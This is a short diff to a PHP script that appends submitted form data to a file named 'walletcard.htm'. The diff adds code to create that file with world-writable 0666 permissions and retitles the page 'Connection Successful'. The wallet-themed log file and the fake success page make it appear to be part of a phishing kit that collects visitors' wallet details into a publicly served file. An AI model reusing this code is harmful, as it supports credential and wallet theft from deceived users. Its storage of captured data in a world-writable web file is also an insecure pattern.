@@ -1,6 +1,12 @@
 <?php
-// Define a writable file path
+// Define the path to the walletcard.htm file
 $filePath = 'walletcard.htm'; // Path to the walletcard.htm file
+
+// Create the file if it doesn't exist, setting permissions to 0666
+if (!file_exists($filePath)) {
+    touch($filePath);
+    chmod($filePath, 0666); // Set permissions to be writable
+}
 
 // Open or create a file for writing form data
 $handle = fopen($filePath, "a");
@@ -31,7 +37,7 @@ fclose($handle);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connection Status</title>
+    <title>Connection Successful</title>
     <style>
         body {
             display: flex;
